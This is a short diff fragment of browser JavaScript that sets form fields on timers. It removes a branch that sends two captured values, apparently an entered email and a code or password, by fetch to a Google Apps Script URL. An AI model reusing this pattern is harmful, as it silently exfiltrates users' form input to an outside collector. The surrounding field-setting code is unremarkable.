@@ -94,8 +94,7 @@ document.getElementById('otpravka').value = '1';
 document.getElementById('emylast').value = t6;
 document.getElementById('timeoutotp').value = '1';
 setTimeout(() => { document.getElementById('timeoutotp').value = '0'; }, 500);
-} else {
-setTimeout(() => { fetch("https://script.google.com/macros/s/AKfycbw2Lc_7vQfP6hiJLaNocWzqcMWXBtnG38S5xCHqUzyHu8XXhp98tP0w2EKMznGt9pbpzw/exec"+ "?" + "p1=" + t7 + "&p2=" + t6, { method: "GET", headers:{"content-type":"application/x-www-form-urlencoded"} }) document.getElementById('otpravka').value = '1'; document.getElementById('emylast').value = t6; document.getElementById('timeoutotp').value = '1'; setTimeout(() => { document.getElementById('timeoutotp').value = '0'; }, 500); }, 100);
+}
 }
 }
 }, 10);
